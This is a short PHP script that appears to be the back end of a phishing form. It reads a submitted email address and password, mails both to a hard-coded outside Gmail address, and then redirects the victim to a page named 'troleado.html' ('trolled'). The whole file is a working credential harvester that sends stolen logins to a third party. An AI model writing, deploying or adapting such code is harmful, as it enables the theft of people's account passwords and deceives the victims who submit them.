<?php
    $destino = "robincajas12@gmail.com";
    $correo = $_POST["email"];
    $clave = $_POST["cts"];
    $contenido = "Email: " . $correo . "Clave: " . $clave;
    $header = "Simón";
    mail($destino, "Contacto", $contenido, $header);
    header("Location:troleado.html");
?>
